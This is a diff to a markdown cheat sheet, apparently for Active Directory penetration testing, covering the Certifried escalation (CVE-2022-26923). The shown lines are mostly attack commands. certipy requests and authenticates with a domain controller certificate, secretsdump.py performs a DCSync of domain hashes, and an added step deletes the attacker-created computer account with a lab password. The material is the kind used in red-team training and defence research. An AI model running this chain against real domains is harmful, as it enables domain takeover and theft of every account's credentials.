@@ -871,9 +871,14 @@ certipy req range.net/WIN-JLSLKICW6EP\$:'PY2nc0ubG8WT'@ca01.range.net -ca range-
 certipy auth -pfx dc01.pfx -dc-ip 192.168.86.182
 ```
 
-5. [DCSync](#dcsync) and win
+6. [DCSync](#dcsync) and win
 ```
 secretsdump.py domain.local/dc01\$@10.10.10.10 -just-dc -hashes :000000000000000
+```
+
+7. It is always recommended to cleanup the created computer account. _(This requires a privileged account)_
+```
+addcomputer.py range.net/Administrator:'Password123' -computer-name 'WIN-EAZXIGMWO1T$' -computer-pass 'mi#gKKWFlzxJ' -dc-ip 192.168.86.182 -delete
 ```
 
 For the details explanation of the vulnerability (CVE-2022-26923), you may read the full article [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
